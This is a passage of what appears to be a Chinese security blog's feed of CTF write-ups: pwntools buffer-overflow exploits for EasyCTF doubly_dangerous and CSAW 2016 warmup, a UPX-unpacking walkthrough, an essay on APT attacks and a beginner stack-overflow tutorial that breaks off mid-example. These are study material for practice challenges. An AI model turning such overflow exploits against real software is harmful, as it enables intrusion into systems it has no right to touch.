flag_frsm_id = <span class="hljs-literal">None</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;confirmedserviceresponse&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(pkt.confirmedserviceresponse) == <span class="hljs-number">73</span> <span class="hljs-keyword">and</span> flag_read:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;filedata&quot;</span>):<br>                            data = <span class="hljs-built_in">str</span>(pkt.filedata).replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                            <span class="hljs-built_in">print</span>(hex_to_ascii(data))<br>                        flag_read = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_ascii</span>(<span class="hljs-params">data</span>):<br>    data = data.decode(<span class="hljs-string">&quot;hex&quot;</span>)<br>    flags = []<br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:<br>        _<span class="hljs-built_in">ord</span> = <span class="hljs-built_in">ord</span>(d)<br>        <span class="hljs-keyword">if</span> (_<span class="hljs-built_in">ord</span> &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">and</span> (_<span class="hljs-built_in">ord</span> &lt; <span class="hljs-number">128</span>):<br>            flags.append(<span class="hljs-built_in">chr</span>(_<span class="hljs-built_in">ord</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(flags)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    flag()<br></code></pre></td></tr></table></figure><p>得到<code>flag.txt</code>文件的内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">61850@102<br></code></pre></td></tr></table></figure><p><strong>总结：</strong></p><p>本题的难点在于学会用<code>pyshark</code>对数据包进行分析，并需要了解协议的组成成分以及指令含义</p>]]></content>
    
    
    <categories>
      
      <category>工业控制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>工业控制安全</tag>
      
      <tag>数据包分析</tag>
      
      <tag>2018年工业信息安全技能大赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyCTF 2017-doubly_dangerous writeup</title>
    <link href="/2018/10/EasyCTF-2017-doubly-dangerous-writeup/"/>
    <url>/2018/10/EasyCTF-2017-doubly-dangerous-writeup/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Hvnt3r/challenges/raw/master/CTF/PWN_start/doubly_dangerous">题目下载链接</a></p><p>拿到题目还是先看一下基本信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  EasyCTF 2017-doubly_dangerous  file doubly_dangerous <br>doubly_dangerous: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=9e428a56c9c1db006d533565eb3f8e29391c5bdd, not stripped<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br></code></pre></td></tr></table></figure><p>本程序是一个32位动态链接程序，并且开启了堆栈执行保护NX</p><span id="more"></span><p>main函数逻辑如下</p><p><img src="https://i.loli.net/2018/10/15/5bc46a0c19147.png"></p><p>很简单的一道溢出题，可以一题多解</p><p><strong>解法一</strong></p><p>需要将<code>v5</code>的值改为<code>11.28125</code>，唯一难点在于确定<code>11.28125</code>的<a href="https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double">存储方式</a>，</p><p>可以用如下代码打印出我们需要的数据(由于系统环境的差异，此代码运行的结果可能不正确)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">double</span> x = <span class="hljs-number">11.28125</span>;<span class="hljs-comment">//更改为我们要修改的数值</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> n = *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)&amp;x;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llX&quot;</span>,n);<br>&#125;<br></code></pre></td></tr></table></figure><p>还有一种方式是直接看汇编代码：</p><p><img src="https://i.loli.net/2018/10/15/5bc47c981cdfd.png"></p><p>gets()函数之后程序会比较<code>ebp-0xC</code>和<code>0x804876C</code>的值是否相等</p><p><img src="https://i.loli.net/2018/10/15/5bc47dc8b5518.png"></p><p>查看十六进制的数值</p><p><img src="https://i.loli.net/2018/10/15/5bc47e17b54ef.png"></p><p>从而得到我们要的数据<code>0x00803441</code>，但是系统采用的是大端序因而这个值为<code>0x41348000</code></p><p>因为之前写的文章里又不少详细的介绍比如<a href="https://hvnt3r.top/2018/10/2018%E6%8A%A4%E7%BD%91%E6%9D%AFPWN%E9%A2%98%E8%A7%A3/">这个</a>，这里就直接放脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&quot;./doubly_dangerous&quot;</span>)<br>payload=<span class="hljs-string">&quot;&quot;</span><br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">64</span>+p32(<span class="hljs-number">0x41348000</span>)<br>p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br></code></pre></td></tr></table></figure><p><strong>解法二</strong></p><p>通过缓冲区溢出修改<code>get</code>函数的返回地址，使程序转到<code>give_flag()</code>函数</p><p>需要构造4CH+4H即80个任意字符+give_flag()的函数地址</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.update(arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, timeout = <span class="hljs-number">1</span>)<span class="hljs-comment">#初始化上下文环境，主要是系统、架构和读取超时时间</span><br><br>io = process(<span class="hljs-string">&quot;./doubly_dangerous&quot;</span>)<br><br>get_flag_addr = <span class="hljs-number">0x0804857b</span><span class="hljs-comment">#程序中give_flag函数的代码地址</span><br><br>payload = <span class="hljs-string">&#x27;&#x27;</span><br>payload += <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">80</span><span class="hljs-comment">#使用80个任意字符填充</span><br>payload += p64(get_flag_addr)<span class="hljs-comment">#将EIP劫持到get_flag_addr</span><br><br><span class="hljs-built_in">print</span> io.recv()<span class="hljs-comment">#读取程序的输出</span><br>io.sendline(payload)<span class="hljs-comment">#向程序输入payload，注意使用sendline()或者send()的数据末尾加上回车&#x27;\n&#x27;</span><br><span class="hljs-built_in">print</span> io.recv()<span class="hljs-comment">#读取flag</span><br></code></pre></td></tr></table></figure><p>运行脚本即可获得<code>flag</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">easyctf&#123;bofs_and_floats_are_d0uble_tr0uble!&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAW CTF 2016 PWN warmup</title>
    <link href="/2018/10/CSAW-CTF-2016-PWN-warmup/"/>
    <url>/2018/10/CSAW-CTF-2016-PWN-warmup/</url>
    
    <content type="html"><![CDATA[<p>先对文件有个大致的了解，是64位ELF文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  csaw ctf 2016 quals-warmup  <span class="hljs-built_in">ls</span><br>exp.py  flag.txt  readme.txt  warmup<br>☁  csaw ctf 2016 quals-warmup  file warmup <br>warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped<br>☁  csaw ctf 2016 quals-warmup  <span class="hljs-built_in">chmod</span> +x warmup <br>☁  csaw ctf 2016 quals-warmup  ./warmup <br>-Warm Up-<br>WOW:0x40060d<br>&gt;<br></code></pre></td></tr></table></figure><span id="more"></span><p><img src="https://i.loli.net/2018/10/08/5bbab4f87f3ce.png"></p><p>这个程序没有开启任何的保护，而且文件是动态链接却没有给出<code>libc</code></p><p>丢进IDA看一下：</p><p><img src="https://i.loli.net/2018/10/08/5bbab66d032b5.png"></p><p>看到了熟悉的<code>gets()</code>函数，通常一看到这个函数就八成有缓冲区溢出漏洞，可以看出程序为<code>v5</code>开辟了<code>40H</code>的存储空间，所以输入长度超过<code>40H</code>即可造成溢出，再看<code>sprint()</code>函数</p><p><img src="https://i.loli.net/2018/10/08/5bbac8c7057d8.png"></p><p>进入<code>sub_40060D</code>中看一下：</p><p><img src="https://i.loli.net/2018/10/08/5bbac902052df.png"></p><p>可以看到这个函数是获取flag的关键点，程序会打印出此函数的位置，即<code>0x40060d</code>，到这里思路就差不多明了了，我们需要控制溢出位置，把返回地址改为此函数的地址，我们当前函数的返回值位于<code>RBP+8</code>的位置，因此溢出点可以通过计算得出：<code>40H+8H=48H=72</code>，因此python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&#x27;192.168.229.128&#x27;</span>, <span class="hljs-number">10001</span>)<br><br>r.recvuntil(<span class="hljs-string">&#x27;WOW:&#x27;</span>)<br>address = r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">72</span> + p64(<span class="hljs-built_in">int</span>(address, <span class="hljs-number">16</span>))<br><br>r.writeline(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>即可获取flag:<code>FLAG&#123;LET_US_BEGIN_CSAW_2016&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>flag_WriteUp(pwnable.kr_flag)软件脱壳反汇编</title>
    <link href="/2018/09/flag-WriteUp-pwnable-kr-flag-%E8%BD%AF%E4%BB%B6%E8%84%B1%E5%A3%B3%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    <url>/2018/09/flag-WriteUp-pwnable-kr-flag-%E8%BD%AF%E4%BB%B6%E8%84%B1%E5%A3%B3%E5%8F%8D%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<p>题目传送门：<a href="http://pwnable.kr/bin/flag">http://pwnable.kr/bin/flag</a></p><p><img src="https://i.loli.net/2018/09/29/5baedeb0387ef.png"></p><p>这道题严格意义上考察的是软件查壳和脱壳</p><span id="more"></span><p>根据题目hint：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Papa brought me a packed present! let&#x27;s open it.<br><br>Download : http://pwnable.kr/bin/flag<br><br>This is reversing task. all you need is binary<br></code></pre></td></tr></table></figure><p>题目提示我们需要二进制文件，但是他给的文件的不是二进制文件吗</p><p>用xdd命令查看flag的16进制数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali-linux:~/文档/PWN/pwnable.kr/4.flag<span class="hljs-comment"># xxd flag</span><br>...<br>$.....UPX!<br>00051d90: 0000 0000 5550 5821 0d16 0807 19cc 204a  ....UPX!...... J<br>00051da0: dbd8 21c5 3145 0100 5e70 0000 217c 0d00  ..!.1E..^p..!|..<br>00051db0: 4919 0089 bc00 0000                      I.......<br></code></pre></td></tr></table></figure><p>看到文件是upx的壳</p><p>使用<code>upx -d flag</code>命令来去壳</p><p>去壳后把文件丢到<code>IDA</code>里就可以看到flag了</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">UPX...? sounds like a delivery service :)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2017中国高级持续性威胁（APT）研究报告读后感</title>
    <link href="/2018/09/2017%E4%B8%AD%E5%9B%BD%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81%EF%BC%88APT%EF%BC%89%E7%A0%94%E7%A9%B6%E6%8A%A5%E5%91%8A%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    <url>/2018/09/2017%E4%B8%AD%E5%9B%BD%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81%EF%BC%88APT%EF%BC%89%E7%A0%94%E7%A9%B6%E6%8A%A5%E5%91%8A%E8%AF%BB%E5%90%8E%E6%84%9F/</url>
    
    <content type="html"><![CDATA[<h3 id="研究情况"><a href="#研究情况" class="headerlink" title="研究情况"></a>研究情况</h3><p> 首先，从对APT攻击的分析角度来说，美国处于全球领先的地位，中国位居第二。这一现状使我感觉到综合国力的重要性，其安全意识的强弱也决定了谁在网络的战场上更加有话语权，我个人也更加希望国内各界都能把网络安全放在一个极高的地位，毕竟没有网络安全就没有国家安全，有价值存在的地方就应该有安全防护。</p><span id="more"></span><p><strong>国内</strong></p><p> 国内做APT相关研究的公司只有四家： <code>360</code>；<code>微步在线</code>；<code>安天</code>；<code>腾讯</code></p><p> 我认为就样本数量而言，360和腾讯两家占据了国内PC用户“电脑管家”的半壁江山，因此如果有恶意样本的涌入的话，这两家在发现恶意样本时是有绝对的时间优势和数量优势，安天的安全服务面比较广，可能会接触到一些比民用层面更有价值的恶意样本。但是综合四家厂商，我觉得国内或者说全球的APT攻击的研究和学习都是在与黑客的博弈中不断进步的，所以我觉得各家安全厂商的实力会随着研究时间的增多提升分析经验，来达到更高的水平。</p><p><strong>国外</strong></p><p> 美国有很多的安全厂商做APT攻击的研究工作再次就不一一列举了。</p><p> 不禁感叹美国的网络实力的强大，无论是黑客大会的影响力还是安全厂商的个数等等，美国始终是处于一个国际领先的地位，而且个人感觉相比国内，美国黑客似乎更乐于研究，许多事情他们感兴趣就回去做，也不会考虑所作的对于他们带来的收益或者回报，大概这就是真正的geek精神，可能这也在另一方面证实了美国人的生活水平高吧（滑稽脸），做研究不必担心研究不出成果而没饭吃（贫穷脸）。</p><h3 id="APT攻击对象-amp-攻击目的"><a href="#APT攻击对象-amp-攻击目的" class="headerlink" title="APT攻击对象&amp;攻击目的"></a>APT攻击对象&amp;攻击目的</h3><blockquote><p>2017年，APT组织最为关注的机构类型是政府，50%的APT组织以政府为攻击目标；其次是能源行业，受到 25%的APT组织关注。排在APT组织攻击目标前十位的重要领域还有金融、国防、互联网、航空航天、媒体、电信、医疗、化工等。</p><p>2017年，遭到APT攻击最多国家依次是：美国、中国、沙特阿拉伯、韩国、以色列、土耳其、日本、法 国、俄罗斯、德国、西班牙、巴基斯坦和英国这13国家。</p></blockquote><p> APT攻击对象呈现的整体特点是“利益驱动”，说白了就是黑客会攻击价值高的对象，像遭受APT攻击最多的国家排名顺序来说，受攻击国家一般经济情况较好，或者是在政治上有一些利用价值或者攻击价值，攻击的目标一般是高收益产出型或者是高新技术型的企业和机构。从另一方面来说，APT的攻击或者是受攻击国家对攻击来源的猜测已经成了一种外交手段，因而研究APT成了一种比较深层次的研究，而不仅是停留在技术层面。</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p> 我认为无论是什么攻击手法，黑客能够屡屡得手的终极原因还是因为目标人群的安全意识的不足，就APT攻击的目标人群来说，一般不会牵涉上老人或者孩子等一般情况下接触不到黑客感兴趣的对象的目标群体（电信诈骗除外，不属于APT），一般的目标人群是政府或者企业等具有一定效益的机构内的青年工作者或者是中年工作者，即使就黑客攻击目标人群的年龄上看，青年人和中年人的安全意识和判断能力应该是人生整个阶段的鼎盛时期，但是就算是属于这个水平也使完全不足以防御APT攻击的危害的，就像一个word文档，如果黑客冒充以公司上司的身份发送给职员，职员八成不会重复的确认自己的上司的身份，因为可能这是在别人眼里看起来的一种很奇怪的行为，而且可能会影响工作效率，所以就很容易中招。从钓鱼网页来说，攻击成功的主要原因也是安全意识的不足，对一些网站的URL没有一定的敏感度。对于0day漏洞的利用来说，我觉得是整个IT界生态圈的问题，就像微软WindowsXP的0day在很早以前就在暗网出售或者像美国国家安全局发现0day但是为了日后的利益而对消息进行保密工作，但是这时由于微软并不知道漏洞的细节而无法及时给出安全补丁，一旦东窗事发，影响的群体必然庞大造成的后果也不堪设想，但是nday漏洞却依然能发挥攻击的作用，因为大家中并没有在意一些软件或者系统的安全更新，有的人甚至认为更新是软件厂商的一种流氓行为，这也不得不引出国内一些软件的素质现状，和例如很多的APP都会向系统请求一些与软件运行根本无关的权限请求例如一些美颜app会请求访问用户通讯录的权限，这确实是一种流氓行为，我觉得从这个角度来说，国内缺乏一个对权限的限制和申请权限的标准来限制一些软件的流氓行为，而且就Windows的更新机制来说，我认为微软可以对更新内容做出批注，如功能的更新或者是安全性的更新，安全性的更新可以具有一定的强制性来保证系统的安全性，但是一些功能的更新我认为可以给用户一个选择的空间，win10的更新逻辑确实让人抓狂，三天两头进行一个小功能的更新却要花费3个小时或者更多的时间，而且更新之后也会占用C盘很大的空间，会影响磁盘的寿命，这对我这种磁盘转速只有5400转的人就可以说是十分不友好了，可能这也是造成很多人不愿意及时进行系统更新的原因，而且据我个人了解和日常生活经验，像军队和医院等机构的电脑系统一般是winxp或者win7，而且可能由于很多部署好的服务不能下线因此无法完成更新，像军方的电脑做了网络隔离因此根本无法进行更新，因而很多年前就被曝光的漏洞依然存在与这些与世隔绝的电脑上，这些计算机一旦出现与外界数据交互的机会，造成的危害也是十分巨大的。</p><p>因而我觉得在这个大环境下有一些点是要我们每个人注意的：</p><ul><li>保持系统固件或者是重要软件的及时更新</li><li>在一些内部环境中可以使用特定的内部通讯软件，并对通信做强认证</li><li>不轻易打开邮件中的附件，对一些链接保持警惕性</li></ul>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
      <tag>心得</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单的栈溢出_hello_elf</title>
    <link href="/2018/09/%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA-hello-elf/"/>
    <url>/2018/09/%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA-hello-elf/</url>
    
    <content type="html"><![CDATA[<p>最近哥们问了我一道PWN题，觉得比较有代表性而且难度较低，就记录下来以作栈溢出的示例，仅从新手角度分析，大牛绕过</p><p>题目地址：<a href="https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg">https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg</a></p><h2 id="0x00-基本知识"><a href="#0x00-基本知识" class="headerlink" title="0x00 基本知识"></a>0x00 基本知识</h2><p>首先，要进行栈溢出的漏洞利用要理解栈的基础结构以及在计算机内的存储方式，之前就有很多大佬写过相关的文章，我也没必要造轮子，就把链接放在这里吧，<a href="https://baike.baidu.com/item/%E6%A0%88%E6%BA%A2%E5%87%BA/8538051?fr=aladdin">我是链接</a>，这个是百度百科上比较通用的解答，如果觉得不清楚还可以自己查阅其他的文章</p><span id="more"></span><h2 id="0x01-起手第一步"><a href="#0x01-起手第一步" class="headerlink" title="0x01 起手第一步"></a>0x01 起手第一步</h2><p>首先一般我拿到一个二进制文件的时候会先用<code>file</code>命令看一下文件的类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  1  file hello<br>hello: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=547379e1b7bd695a7546d2a3321e199c0474dfa9, not stripped<br></code></pre></td></tr></table></figure><p>这里显示这是一个32位的ELF文件，其实对于新手来说IDA_Pro的一键f5还是挺方便的，我们先把文件放到IDA里看一下：</p><p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png"></p><p>IDA的左侧显示了一些函数的信息，双击函数后再按<code>F5</code>键使IDA显示出伪C代码，这里说是伪C代码是因为这些代码严格意义上不算是C代码，只是IDA为了使程序显示更接近我们的逻辑顺序而显示的一种接近于C语言格式的代码，如果可以通过自己的判断来修复一些伪C代码中的逻辑或者变量名称，可以使得代码接近于源代码，但是我们这道题不涉及修复的知识。</p><p>随便翻看一下这些函数的内容，并在脑海中大致建立一个程序的逻辑框架，看到一个read函数，不知道此函数的作用怎么办，很简单，Linux下自带命令<code>man</code>可与查看函数的手册</p><p>在Linux终端下输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">man <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure><p>此时终端会打印出关于read函数的信息：</p><p><img src="https://i.loli.net/2018/09/28/5bad9a4e28b52.png"></p><p>内容很多，感兴趣的同学可以自己敲一下试试，而我们目前只需关注一下信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">NAME<br>       read - read from a file descriptor<br><br>SYNOPSIS<br>       <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>       <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count)</span>;<br></code></pre></td></tr></table></figure><p>我们需要看一下此函数的相关参数，<code>fd</code>我在<a href="https://hvnt3r.top/2018/09/fd-WriteUp-pwnable-kr%E2%80%94%E2%80%94-fd-Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/">之前的文章中</a>介绍过了，这个是文件描述符，不同的值代表不同的文件读写状态，0代表标准输入，后面的<code>*buf</code>代表输入的内容的指针，再后面的<code>count</code>是输入的字节数，此时看之前IDA中的伪代码就可以知道此程序会从用户的标准输入中读取64个unsigned整型并将此内容print出来，但是为什么这道题有漏洞呢，因为他读取的是64字节的内容，但是再IDA中显示内容得知程序只为V1开辟了0x16的空间，如图：</p><p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png"> </p><p>这显然是会造成栈溢出的，0x16转换为十进制为22，我们可以来验证一下，我个人比较喜欢用<code>gdb</code>来调试ELF文件，其中<code>gdb</code>中有一个十分好用的插件<code>peda</code>，具体的安装方式网上也有很多的教程，在这里我也不浪费时间了，话不多说，<code>gdb</code>启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  1  gdb hello <br>GNU gdb (Debian 8.1-4) 8.1<br>......<br>此处省略N个字<br>......<br>Reading symbols from hello...(no debugging symbols found)...<span class="hljs-keyword">done</span>.<br>gdb-peda$ checksec <br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br></code></pre></td></tr></table></figure><p>先使用<code>checksec</code>来检车一下程序开启的保护措施，可以看到只开启了一个NX，这些保护措施如果不了解没关系，但是第一步<code>checksec</code>是个好习惯。</p><p>我们可以使用<code>r</code>或者<code>run</code>使程序在<code>gdb</code>中运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ r<br>Starting program: /root/0101/1/hello <br>input_test<br>Hello, input_test<br><br>[Inferior 1 (process 4082) exited normally]<br>Warning: not running or target is remote<br></code></pre></td></tr></table></figure><p>可以看到程序正常的执行了</p><p>以上我们对此程序的基础信息算是有所掌握了，接下来进行进一步的探索</p><h2 id="0x02-在溢出的边缘疯狂试探"><a href="#0x02-在溢出的边缘疯狂试探" class="headerlink" title="0x02 在溢出的边缘疯狂试探"></a>0x02 在溢出的边缘疯狂试探</h2><p>首先我们已经知道了这个使考察栈溢出的知识了，常见的栈溢出就是程序对用户的输入长度没有进行严格的限制，会导致用户输入的超过程序限制的长度的数据溢出到非预期的位置，从而造成程序逻辑的混乱或者造成软件被破解、<code>getshell</code>等严重的后果，因此我们需要确定一个简单的攻击路线：</p><ul><li><input checked="" disabled="" type="checkbox"> 确定程序存在的漏洞</li><li><input disabled="" type="checkbox"> 确定溢出点</li><li><input disabled="" type="checkbox"> 寻找溢出利用位置</li><li><input disabled="" type="checkbox"> 成功Getshell</li></ul><p>因此我们需要确认一下溢出点的位置，简单来说就是确定当我们输入多少长度的数据的时候程序会产生溢出，<code>gdb</code>有一个很好的命令可以帮助我们很快的找到溢出点的位置，这个命令就是<code>pattern_creat</code>，使用此命令＋想要生成的字符串的长度就可以生成一串特殊的字符串，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ pattern_creat 50<br><span class="hljs-string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&#x27;</span><br></code></pre></td></tr></table></figure><p>这串字符串每相邻的三位字母都是不同的，因此如果你在其中找到了三个字母如<code>FAA</code>，而这三个字母可以在这个字符串中确定一个唯一的位置。</p><p>我们试一下把这串字符串输入目标程序<code>hello</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ r<br>Starting program: /root/0101/1/hello <br>AAA%AAsAABAA<span class="hljs-variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbA<br></code></pre></td></tr></table></figure><p>敲击回车，此时会发现终端界面发生变化：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 